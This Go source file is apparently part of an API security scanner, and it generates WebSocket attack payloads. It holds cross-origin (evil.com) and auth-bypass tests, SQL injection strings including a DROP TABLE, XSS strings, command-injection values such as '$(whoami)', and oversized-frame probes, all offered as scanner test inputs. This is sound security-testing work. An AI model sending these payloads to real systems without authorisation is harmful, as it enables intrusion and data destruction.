package payloads

import (
	"strings"

	"github.com/su1ph3r/indago/pkg/types"
)

// WebSocketGenerator generates WebSocket attack payloads
type WebSocketGenerator struct{}

// NewWebSocketGenerator creates a new WebSocket payload generator
func NewWebSocketGenerator() *WebSocketGenerator {
	return &WebSocketGenerator{}
}

// Type returns the attack type
func (g *WebSocketGenerator) Type() string {
	return types.AttackWebSocket
}

// Generate generates WebSocket payloads for a parameter
func (g *WebSocketGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	if !g.isWebSocketRelevant(param, endpoint) {
		return payloads
	}

	payloads = append(payloads, g.originValidationPayloads()...)
	payloads = append(payloads, g.authBypassPayloads()...)
	payloads = append(payloads, g.messageInjectionPayloads()...)
	payloads = append(payloads, g.frameManipulationPayloads()...)
	payloads = append(payloads, g.cswshPayloads()...)

	return payloads
}

// isWebSocketRelevant checks if the endpoint is a WebSocket endpoint and
// applies the sentinel pattern to only generate for the first parameter.
func (g *WebSocketGenerator) isWebSocketRelevant(param *types.Parameter, endpoint types.Endpoint) bool {
	pathLower := strings.ToLower(endpoint.Path)

	wsPatterns := []string{
		"/ws", "/websocket", "/socket.io", "/hub", "/signalr",
		"/cable", "/realtime", "/stream", "/events", "/live",
	}

	found := false
	for _, pattern := range wsPatterns {
		if strings.Contains(pathLower, pattern) {
			found = true
			break
		}
	}

	if !found {
		return false
	}

	// Sentinel: only generate for first parameter to avoid duplicates
	if len(endpoint.Parameters) > 0 && param.Name != endpoint.Parameters[0].Name {
		return false
	}
	if endpoint.Body != nil && len(endpoint.Parameters) == 0 &&
		len(endpoint.Body.Fields) > 0 && param.Name != endpoint.Body.Fields[0].Name {
		return false
	}

	return true
}

// originValidationPayloads generates cross-origin connection attempt payloads
func (g *WebSocketGenerator) originValidationPayloads() []Payload {
	return []Payload{
		{
			Value:       "websocket_origin_evil",
			Type:        types.AttackWebSocket,
			Category:    "websocket",
			Description: "WebSocket cross-origin: connect with evil.com origin",
			Metadata: map[string]string{
				"transport": "websocket",
				"origin":    "https://evil.com",
			},
		},
		{
			Value:       "websocket_origin_null",
			Type:        types.AttackWebSocket,
			Category:    "websocket",
			Description: "WebSocket cross-origin: connect with null origin",
			Metadata: map[string]string{
				"transport": "websocket",
				"origin":    "null",
			},
		},
	}
}

// authBypassPayloads generates authentication bypass payloads for WebSocket connections
func (g *WebSocketGenerator) authBypassPayloads() []Payload {
	return []Payload{
		{
			Value:       "websocket_no_auth",
			Type:        types.AttackWebSocket,
			Category:    "websocket",
			Description: "WebSocket auth bypass: connect without authentication",
			Metadata: map[string]string{
				"transport":  "websocket",
				"strip_auth": "true",
			},
		},
		{
			Value:       "websocket_expired_token",
			Type:        types.AttackWebSocket,
			Category:    "websocket",
			Description: "WebSocket auth bypass: connect with expired token",
			Metadata: map[string]string{
				"transport":  "websocket",
				"auth_token": "expired_token_value",
			},
		},
	}
}

// messageInjectionPayloads generates injection payloads sent over WebSocket messages
func (g *WebSocketGenerator) messageInjectionPayloads() []Payload {
	return []Payload{
		// SQL injection messages
		{
			Value:       `{"query": "' OR 1=1--"}`,
			Type:        types.AttackWebSocket,
			Category:    "websocket",
			Description: "WebSocket SQL injection: OR 1=1 in query field",
			Metadata: map[string]string{
				"transport": "websocket",
			},
		},
		{
			Value:       `{"id": "1; DROP TABLE users--"}`,
			Type:        types.AttackWebSocket,
			Category:    "websocket",
			Description: "WebSocket SQL injection: DROP TABLE in id field",
			Metadata: map[string]string{
				"transport": "websocket",
			},
		},
		// XSS messages
		{
			Value:       `{"message": "<script>alert(1)</script>"}`,
			Type:        types.AttackWebSocket,
			Category:    "websocket",
			Description: "WebSocket XSS: script tag in message field",
			Metadata: map[string]string{
				"transport": "websocket",
			},
		},
		{
			Value:       `{"content": "<img src=x onerror=alert(1)>"}`,
			Type:        types.AttackWebSocket,
			Category:    "websocket",
			Description: "WebSocket XSS: img onerror in content field",
			Metadata: map[string]string{
				"transport": "websocket",
			},
		},
		// Command injection messages
		{
			Value:       `{"cmd": "; whoami"}`,
			Type:        types.AttackWebSocket,
			Category:    "websocket",
			Description: "WebSocket command injection: semicolon whoami",
			Metadata: map[string]string{
				"transport": "websocket",
			},
		},
		{
			Value:       `{"input": "$(whoami)"}`,
			Type:        types.AttackWebSocket,
			Category:    "websocket",
			Description: "WebSocket command injection: subshell whoami",
			Metadata: map[string]string{
				"transport": "websocket",
			},
		},
	}
}

// frameManipulationPayloads generates protocol-level WebSocket frame manipulation payloads
func (g *WebSocketGenerator) frameManipulationPayloads() []Payload {
	return []Payload{
		{
			Value:       strings.Repeat("A", 65536),
			Type:        types.AttackWebSocket,
			Category:    "websocket",
			Description: "WebSocket frame manipulation: oversized frame (64KB)",
			Metadata: map[string]string{
				"transport": "websocket",
			},
		},
		{
			Value:       "\x00\x01\x02\xff\xfe\xfd",
			Type:        types.AttackWebSocket,
			Category:    "websocket",
			Description: "WebSocket frame manipulation: binary/text frame confusion",
			Metadata: map[string]string{
				"transport": "websocket",
			},
		},
	}
}

// cswshPayloads generates Cross-Site WebSocket Hijacking payloads
func (g *WebSocketGenerator) cswshPayloads() []Payload {
	return []Payload{
		{
			Value:       "websocket_cswsh_test",
			Type:        types.AttackWebSocket,
			Category:    "websocket",
			Description: "CSWSH: simulate WebSocket connection from attacker-controlled page",
			Metadata: map[string]string{
				"transport": "websocket",
				"csrf_test": "true",
			},
		},
	}
}
